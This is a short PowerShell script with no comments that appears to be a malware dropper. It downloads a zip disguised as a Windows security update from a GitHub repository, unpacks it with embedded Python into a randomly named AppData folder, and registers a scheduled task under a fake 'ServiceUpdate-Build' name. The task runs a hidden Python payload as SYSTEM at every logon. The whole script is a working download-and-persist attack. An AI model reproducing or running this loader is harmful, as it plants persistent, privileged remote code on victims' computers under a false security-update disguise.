$ErrorActionPreference = "Stop"
$AppDataPath = $env:APPDATA
$Length = 10
$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
$FolderName = "$RandomString"
$MAJOR = Get-Random -Minimum 1 -Maximum 11
$MINOR = Get-Random -Minimum 0 -Maximum 100
$BUILD = Get-Random -Minimum 0 -Maximum 1000
$REVISION = Get-Random -Minimum 0 -Maximum 10000
$VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $AppDataPath\WindowsSecurityUI.zip
Expand-Archive -Path $AppDataPath\WindowsSecurityUI.zip -DestinationPath $AppDataPath\$FolderName
wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
Expand-Archive -Path $AppDataPath\python-3.14.0-embed-amd64.zip -DestinationPath $AppDataPath\$FolderName\WindowsSecurityUI
$winsecUI = Join-Path $AppDataPath "$FolderName\WindowsSecurityUI"
$serviceUIPath = Join-Path $winsecUI "ServiceUI.exe"
$wssrvcPyPath = Join-Path $winsecUI "wssrvc.py"
$pythonwExePath = Join-Path $winsecUI "pythonw.exe"
rm $env:APPDATA\WindowsSecurity.zip
rm $env:APPDATA\python-3.14.0-embed-amd64.zip
$scheduledTaskName = "ServiceUpdate-Build-$VERSION"
$action = New-ScheduledTaskAction -Execute $serviceUIPath -Argument "$pythonwExePath $wssrvcPyPath"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName $scheduledTaskName -Action $action -Trigger $trigger -User "System" -Force
Start-ScheduledTask -TaskName $scheduledTaskName
